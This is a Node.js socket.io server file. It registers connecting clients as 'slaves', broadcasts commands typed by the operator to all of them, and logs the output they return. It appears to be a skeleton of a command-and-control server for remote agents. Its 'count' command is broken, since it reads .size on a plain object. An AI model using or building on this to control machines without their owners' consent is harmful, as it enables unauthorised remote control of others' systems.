const io = require('socket.io')(3000);
const readline = require('readline');

let ids = {};

// Create readline interface
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

io.on('connection', (socket) => {
  socket.on('message', (data) => {
    socket.broadcast.emit('message', data);
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    // to do
  });

  socket.on("register", (data) => {
    // add slave to the list using a map
    //ids.set(data.id, socket);

    // add slave to the list using an object
    ids[data.id] = socket;
    console.log("\n\n[INFO] Received register", data);
    });

  socket.on("output", (data) => {
    console.log("\n\n[INFO] Received output,", data);
    });
});


// Continuously listen for input from the user
rl.prompt();
rl.on('line', (input) => {
  // Send command to connected clients

  if (input === 'clear') {
    console.clear();
    rl.prompt();
    return;
  } else if (input === 'exit') {
    rl.close();
    return;
  } else if (input === 'count') {
    console.log(`\n\n[INFO] Number of connectins: ${ids.size}`);
    rl.prompt();
    return;
  }

  io.emit('message', input);
  rl.prompt();
});

// Display prompt
rl.prompt();
